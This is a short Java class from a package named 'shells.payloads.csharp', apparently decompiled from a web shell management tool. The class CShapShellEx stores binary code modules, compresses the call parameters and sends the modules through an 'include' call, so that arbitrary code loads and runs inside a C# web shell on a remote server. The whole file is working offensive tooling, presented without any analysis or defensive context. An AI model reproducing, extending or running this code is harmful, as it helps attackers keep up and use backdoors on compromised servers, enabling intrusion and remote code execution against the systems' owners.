package shells.payloads.csharp;

import java.util.HashMap;
import util.functions;
import util.http.ReqParameter;

public class CShapShellEx extends CShapShell {
   private final HashMap<String, byte[]> moduleMap = new HashMap();

   public boolean include(String codeName, byte[] binCode) {
      this.moduleMap.put(codeName, binCode);
      return true;
   }

   public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
      if (className != null && className.trim().length() > 0) {
         if (this.moduleMap.get(className) != null) {
            ReqParameter evalNextData = new ReqParameter();
            evalNextData.add("codeName", className);
            evalNextData.add("binCode", (byte[])this.moduleMap.get(className));
            parameter.add("evalClassName", className);
            parameter.add("methodName", funcName);
            evalNextData.add("evalNextData", functions.gzipE(parameter.formatEx()));
            return super.evalFunc((String)null, "include", evalNextData);
         } else {
            return "no include".getBytes();
         }
      } else {
         return super.evalFunc(className, funcName, parameter);
      }
   }
}
